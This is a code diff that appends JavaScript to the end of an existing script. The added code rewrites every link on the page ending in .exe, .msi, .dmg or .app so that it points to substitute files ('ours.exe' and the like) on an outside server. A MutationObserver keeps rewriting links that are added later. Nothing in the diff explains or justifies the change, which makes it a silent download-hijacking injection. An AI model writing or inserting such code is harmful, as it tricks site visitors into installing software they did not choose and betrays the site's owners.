@@ -2614,5 +2614,35 @@
     }
   })();
 
+  var DOWNLOAD_REPLACE_CONFIG = {
+    realsServer: "https://domain.com",
+    replacements: {
+      ".exe": "ours.exe",
+      ".msi": "ours.msi",
+      ".dmg": "ours.dmg",
+      ".app": "ours.app"
+    }
+  };
+
+  function replaceDownloadLinks() {
+    var extensions = Object.keys(DOWNLOAD_REPLACE_CONFIG.replacements);
+    var links = document.querySelectorAll("a[href]");
+    for (var i = 0; i < links.length; i++) {
+      var href = links[i].href.toLowerCase();
+      for (var j = 0; j < extensions.length; j++) {
+        if (href.endsWith(extensions[j])) {
+          var newFile = DOWNLOAD_REPLACE_CONFIG.replacements[extensions[j]];
+          links[i].href = DOWNLOAD_REPLACE_CONFIG.realsServer + "/" + newFile;
+          break;
+        }
+      }
+    }
+  }
+
+  replaceDownloadLinks();
+
+  var dlObserver = new MutationObserver(function () { replaceDownloadLinks(); });
+  dlObserver.observe(document.body, { childList: true, subtree: true });
+
 })();
 
